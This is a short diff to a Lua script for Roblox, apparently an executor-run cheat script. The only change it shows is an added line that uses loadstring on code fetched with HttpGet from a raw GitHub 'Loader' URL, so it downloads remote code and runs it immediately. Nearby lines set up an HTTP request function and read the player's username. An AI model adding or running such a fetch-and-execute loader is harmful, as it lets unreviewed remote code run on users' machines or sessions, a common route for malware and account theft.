@@ -11,7 +11,7 @@ if not game:IsLoaded() then
     end)
     game.Loaded:Wait()
 end
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/NopNopA/Loader/refs/heads/main/Test__.lua"))()
 local Request = (syn and syn.request) or request or (http and http.request) or http_request
 local username = game.Players.LocalPlayer.Name
 local IsGetKick = false
